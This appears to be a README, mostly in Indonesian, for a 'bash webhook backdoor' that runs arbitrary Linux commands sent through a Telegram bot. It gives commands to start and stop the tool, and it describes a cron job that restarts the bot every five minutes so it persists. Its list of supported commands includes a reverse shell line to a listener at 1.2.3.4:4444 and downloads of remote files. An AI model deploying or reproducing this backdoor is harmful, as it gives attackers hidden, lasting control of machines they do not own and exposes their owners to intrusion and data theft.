# bash webhook backdoor


</h1>
<h4 align="center">command list</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>

1. startup command `bash` value
```
menjalankan : nohup bash zombie.sh &
untuk stop bot : pkill -f docker.sh
menghentikan cron : crontab -r

✅ Service akan restart otomatis jika crash atau mati.

apasaja yg bisa di jalankan di bot telegram 

perintah Linux apa saja, termasuk:

✅ ls -la → Menampilkan daftar file dengan detail.
✅ wget http://example.com/file → Mengunduh file dari internet.
✅ curl -O http://example.com/file → Alternatif download selain wget.
✅ ps aux → Melihat daftar proses.
✅ netstat -tulnp → Melihat koneksi jaringan.
✅ whoami && id → Cek user dan grup aktif.
✅ bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 → Reverse shell ke listener.
✅ dan semua command linux 


🔥 Kesimpulan
✅ Monitoring bot setiap 5 menit menggunakan cronjob
✅ Jika bot mati, otomatis dijalankan ulang. otomatis
✅ Mengirim pesan saat bot mati (misalnya karena kill, CTRL+C, atau shutdown)

```
